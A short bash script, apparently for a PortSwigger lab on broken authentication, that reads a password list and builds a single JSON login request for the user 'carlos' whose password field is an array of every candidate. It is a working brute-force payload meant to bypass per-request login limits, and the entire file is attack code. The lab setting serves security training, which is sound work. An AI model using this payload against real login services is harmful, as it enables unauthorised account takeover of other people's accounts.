#!/bin/bash
# for portswigger lab broken auth - sending multiple password in one req
# generating payload containing array of password
# default data is sent in form of -> {"username":"carlos","password":"a","":""}
# list.txt is the file containing passwords
a='{"username":"carlos","password":["a"'
while read LINE  ; do
    b=$(echo ',"'$LINE'"')
    a=$(echo $a$b)
    #a={"username":"carlos","password":["a","line1","line2".....
done<list.txt
echo $a"]}"
#a={"username":"carlos","password":["a","line1","line2".....]} -> final payload

